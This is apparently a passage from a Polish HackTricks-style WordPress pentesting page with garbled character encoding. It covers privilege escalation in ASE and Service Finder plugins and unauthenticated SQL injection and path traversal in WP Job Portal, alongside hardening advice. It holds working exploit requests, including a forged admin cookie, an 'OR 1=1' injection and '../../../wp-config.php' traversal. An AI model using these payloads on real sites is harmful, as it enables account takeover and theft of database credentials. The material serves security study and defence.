Wiele wtyczek implementuje funkcjÄ™ "view as role" lub tymczasowego przeÅ‚Ä…czania rÃ³l, zapisujÄ…c oryginalne role w user meta, aby mogÅ‚y byÄ‡ przywrÃ³cone pÃ³Åºniej. JeÅ›li Å›cieÅ¼ka przywracania polega wyÅ‚Ä…cznie na parametrach Å¼Ä…dania (np. `$_REQUEST['reset-for']`) i utrzymywanej przez wtyczkÄ™ liÅ›cie, bez sprawdzenia capabilities i waÅ¼nego nonce, prowadzi to do vertical privilege escalation.

PrzykÅ‚ad z prawdziwego Å›wiata znaleziono we wtyczce Admin and Site Enhancements (ASE) (â‰¤ 7.6.2.1). GaÅ‚Ä…Åº resetu przywracaÅ‚a role na podstawie `reset-for=<username>` jeÅ›li nazwa uÅ¼ytkownika pojawiaÅ‚a siÄ™ w wewnÄ™trznej tablicy `$options['viewing_admin_as_role_are']`, ale nie wykonywaÅ‚a ani sprawdzenia `current_user_can()`, ani weryfikacji nonce przed usuniÄ™ciem bieÅ¼Ä…cych rÃ³l i ponownym dodaniem zapisanych rÃ³l z user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Dlaczego to jest podatne

- Ufa `$_REQUEST['reset-for']` i opcji pluginu bez autoryzacji po stronie serwera.
- JeÅ›li uÅ¼ytkownik wczeÅ›niej miaÅ‚ wyÅ¼sze uprawnienia zapisane w `_asenha_view_admin_as_original_roles` i zostaÅ‚ zdegradowany, moÅ¼e je przywrÃ³ciÄ‡ przez odwiedzenie reset path.
- W niektÃ³rych wdroÅ¼eniach dowolny uwierzytelniony uÅ¼ytkownik mÃ³gÅ‚ wywoÅ‚aÄ‡ reset dla innej nazwy uÅ¼ytkownika wciÄ…Å¼ obecnej w `viewing_admin_as_role_are` (bÅ‚Ä™dna autoryzacja).

Wymagania wstÄ™pne ataku

- WraÅ¼liwa wersja pluginu z wÅ‚Ä…czonÄ… funkcjÄ….
- Konto celu ma przestarzaÅ‚Ä… rolÄ™ o wysokich uprawnieniach zapisanÄ… w user meta z wczeÅ›niejszego uÅ¼ycia.
- Dowolna uwierzytelniona sesja; brak nonce/capability w przepÅ‚ywie resetu.

Eksploatacja (przykÅ‚ad)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
W podatnych buildach to usuwa obecne role i ponownie dodaje zapisane oryginalne role (np. `administrator`), skutecznie eskalujÄ…c uprawnienia.

Detection checklist

- Szukaj funkcji przeÅ‚Ä…czania rÃ³l, ktÃ³re przechowujÄ… â€original rolesâ€ w user meta (np. `_asenha_view_admin_as_original_roles`).
- Zidentyfikuj Å›cieÅ¼ki resetowania/przywracania, ktÃ³re:
- OdczytujÄ… nazwy uÅ¼ytkownikÃ³w z `$_REQUEST` / `$_GET` / `$_POST`.
- ModyfikujÄ… role za pomocÄ… `add_role()` / `remove_role()` bez `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- AutoryzujÄ… na podstawie tablicy opcji wtyczki (np. `viewing_admin_as_role_are`) zamiast na podstawie uprawnieÅ„ wykonawcy.

Hardening

- Wymuszaj sprawdzenia uprawnieÅ„ w kaÅ¼dej gaÅ‚Ä™zi zmieniajÄ…cej stan (np. `current_user_can('manage_options')` lub bardziej restrykcyjne).
- Wymagaj nonce'Ã³w dla wszystkich mutacji rÃ³l/uprawnieÅ„ i weryfikuj je: `check_admin_referer()` / `wp_verify_nonce()`.
- Nigdy nie ufaj nazwom uÅ¼ytkownikÃ³w przesyÅ‚anym w Å¼Ä…daniu; okreÅ›l docelowego uÅ¼ytkownika po stronie serwera na podstawie uwierzytelnionego wykonawcy i wyraÅºnej polityki.
- UniewaÅ¼niaj stan â€original rolesâ€ przy aktualizacjach profilu/roli, aby uniknÄ…Ä‡ przywrÃ³cenia przestarzaÅ‚ych wysokich uprawnieÅ„:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- RozwaÅ¼ przechowywanie minimalnego stanu i uÅ¼ywanie tokenÃ³w o ograniczonym czasie waÅ¼noÅ›ci, capability-guarded, do tymczasowych zmian rÃ³l.

---

### Nieautoryzowana privilege escalation via cookieâ€‘trusted user switching na publicznym `init` (Service Finder â€œsf-bookingâ€)

NiektÃ³re wtyczki podÅ‚Ä…czajÄ… helpery do przeÅ‚Ä…czania uÅ¼ytkownika do publicznego hooka `init` i wyprowadzajÄ… toÅ¼samoÅ›Ä‡ z kontrolowanego przez klienta cookie. JeÅ›li kod wywoÅ‚uje `wp_set_auth_cookie()` bez weryfikacji uwierzytelnienia, capability i waÅ¼nego nonce, dowolny nieautoryzowany odwiedzajÄ…cy moÅ¼e wymusiÄ‡ zalogowanie jako dowolny identyfikator uÅ¼ytkownika.

Typowy podatny wzorzec (upraszczajÄ…c z Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Dlaczego jest to podatne

- Publiczny hook `init` sprawia, Å¼e handler jest osiÄ…galny dla niezalogowanych uÅ¼ytkownikÃ³w (brak zabezpieczenia `is_user_logged_in()`).
- ToÅ¼samoÅ›Ä‡ pochodzi z cookie modyfikowalnego przez klienta (`original_user_id`).
- BezpoÅ›rednie wywoÅ‚anie `wp_set_auth_cookie($uid)` loguje Å¼Ä…dajÄ…cego jako tego uÅ¼ytkownika bez Å¼adnych sprawdzeÅ„ uprawnieÅ„/nonce.

Eksploatacja (bez uwierzytelnienia)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### RozwaÅ¼ania dotyczÄ…ce WAF dla WordPress/plugin CVEs

OgÃ³lne WAFy brzegowe/serwerowe sÄ… dostrojone pod szerokie wzorce (SQLi, XSS, LFI). Wiele wysoko wpÅ‚ywowych luk w WordPress/plugin to bÅ‚Ä™dy logiki/autoryzacji specyficzne dla aplikacji, ktÃ³re wyglÄ…dajÄ… jak nieszkodliwy ruch, chyba Å¼e silnik rozumie trasy WordPress i semantykÄ™ pluginÃ³w.

Notatki ofensywne

- Celuj w endpointy specyficzne dla pluginÃ³w za pomocÄ… czystych payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Najpierw testuj Å›cieÅ¼ki bez uwierzytelnienia (AJAX `nopriv`, REST z permissive `permission_callback`, public shortcodes). DomyÅ›lne payloads czÄ™sto dziaÅ‚ajÄ… bez obfuskacji.
- Typowe przypadki o duÅ¼ym wpÅ‚ywie: eskalacja uprawnieÅ„ (broken access control), arbitrary file upload/download, LFI, open redirect.

Notatki defensywne

- Nie polegaj na ogÃ³lnych sygnaturach WAF w celu ochrony plugin CVEs. WdrÃ³Å¼ wirtualne poprawki na warstwie aplikacji, specyficzne dla danej podatnoÅ›ci, lub aktualizuj szybko.
- Preferuj pozytywne kontrole bezpieczeÅ„stwa w kodzie (capabilities, nonces, strict input validation) zamiast negatywnych filtrÃ³w regex.

## Ochrona WordPress

### Regularne aktualizacje

Upewnij siÄ™, Å¼e WordPress, plugins i themes sÄ… aktualne. PotwierdÅº teÅ¼, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
RÃ³wnieÅ¼, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki bezpieczeÅ„stwa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

- UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
- UÅ¼ywaj **silnych haseÅ‚** i **2FA**
- Okresowo **przeglÄ…daj** uprawnienia uÅ¼ytkownikÃ³w
- **Ogranicz liczbÄ™ prÃ³b logowania**, aby zapobiec atakom Brute Force
- ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwalaj na dostÄ™p tylko wewnÄ™trznie lub z wybranych adresÃ³w IP.


### SQL Injection bez uwierzytelnienia przez niewystarczajÄ…cÄ… walidacjÄ™ (WP Job Portal <= 2.3.2)

Wtyczka rekrutacyjna WP Job Portal udostÄ™pniaÅ‚a zadanie **savecategory**, ktÃ³re ostatecznie wykonuje nastÄ™pujÄ…cy podatny kod w `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Niezabezpieczone dane wejÅ›ciowe uÅ¼ytkownika** â€“ `parentid` pochodzi bezpoÅ›rednio z Å¼Ä…dania HTTP.
2. **Konkatenacja Å‚aÅ„cuchÃ³w w klauzuli WHERE** â€“ brak `is_numeric()` / `esc_sql()` / prepared statement.
3. **DostÄ™p bez uwierzytelnienia** â€“ chociaÅ¼ akcja jest wykonywana przez `admin-post.php`, jedynÄ… kontrolÄ… jest **CSRF nonce** (`wp_verify_nonce()`), ktÃ³ry kaÅ¼dy odwiedzajÄ…cy moÅ¼e pobraÄ‡ ze strony publicznej osadzonej przez shortcode `[wpjobportal_my_resumes]`.

#### Eksploatacja

1. Pobierz Å›wieÅ¼y nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Wstrzyknij dowolne SQL, wykorzystujÄ…c `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
OdpowiedÅº ujawnia wynik wstrzykniÄ™tego zapytania lub modyfikuje bazÄ™ danych, potwierdzajÄ…c SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Inne zadanie, **downloadcustomfile**, pozwalaÅ‚o odwiedzajÄ…cym na pobranie **dowolnego pliku z dysku** przez path traversal.  WraÅ¼liwy sink znajduje siÄ™ w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakujÄ…cego i konkatenowany **bez sanityzacji**. Ponownie, jedynÄ… blokadÄ… jest **CSRF nonce**, ktÃ³ry moÅ¼na pobraÄ‡ ze strony resume.

#### Eksploatacja
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer zwraca zawartoÅ›Ä‡ `wp-config.php`, leaking DB credentials and auth keys.

## OdnoÅ›niki

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
